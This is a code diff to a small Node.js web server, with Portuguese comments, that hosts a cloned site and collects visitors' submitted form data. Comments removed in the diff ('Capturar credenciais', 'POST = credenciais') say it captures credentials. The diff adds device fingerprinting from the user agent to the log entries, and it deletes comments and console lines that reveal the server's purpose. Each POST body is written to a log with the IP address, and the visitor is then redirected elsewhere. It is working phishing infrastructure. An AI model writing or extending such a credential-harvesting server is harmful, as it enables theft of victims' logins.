@@ -26,35 +26,44 @@ const MIME = {
     '.webp': 'image/webp',
 };
 
-// Capturar credenciais
-function captureAndLog(body, clientIP) {
+function detectDevice(userAgent) {
+    const ua = (userAgent || '').toLowerCase();
+    if (/android/.test(ua)) return '📱 Android';
+    if (/iphone|ipad/.test(ua)) return '📱 iOS';
+    if (/windows/.test(ua)) return '💻 Windows';
+    if (/macintosh|mac os/.test(ua)) return '💻 macOS';
+    if (/linux/.test(ua)) return '💻 Linux';
+    return '? Desconhecido';
+}
+
+function captureAndLog(body, clientIP, userAgent) {
     const ts = new Date().toISOString().replace('T', ' ').split('.')[0];
+    const device = detectDevice(userAgent);
     const params = new URLSearchParams(body);
     const data = {};
     for (let [k, v] of params.entries()) {
         data[k] = v;
     }
-    const entry = `[${ts}] IP: ${clientIP}\n  Dados: ${JSON.stringify(data)}\n`;
+    const entry = `[${ts}] IP: ${clientIP} | Device: ${device}\n  Dados: ${JSON.stringify(data)}\n`;
     fs.appendFileSync(LOG_FILE, entry);
     console.log(`\n\n🚨 CAPTURADO:\n${entry}`);
 }
 
 const server = http.createServer((req, res) => {
     const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '?';
+    const userAgent = req.headers['user-agent'] || '';
 
-    // POST = credenciais
     if (req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', () => {
-            if (body) captureAndLog(body, clientIP);
+            if (body) captureAndLog(body, clientIP, userAgent);
             res.writeHead(302, { 'Location': REDIRECT_URL });
             res.end();
         });
         return;
     }
 
-    // GET = servir arquivo
     let urlPath = req.url.split('?')[0];
     if (urlPath === '/' || urlPath === '') urlPath = '/index.html';
 
@@ -64,7 +73,6 @@ const server = http.createServer((req, res) => {
 
     fs.readFile(filePath, (err, data) => {
         if (err) {
-            // Tentar servir index.html (SPA)
             fs.readFile(path.join(SITE_DIR, 'index.html'), (err2, idx) => {
                 if (err2) {
                     res.writeHead(404, { 'Content-Type': 'text/plain' });
@@ -83,8 +91,6 @@ const server = http.createServer((req, res) => {
 
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`Servidor: http://0.0.0.0:${PORT}`);
-    console.log(`Log: ${LOG_FILE}`);
-    console.log(`Site: ${SITE_DIR}`);
 }).on('error', (err) => {
     console.error(`ERRO: ${err.message}`);
 });
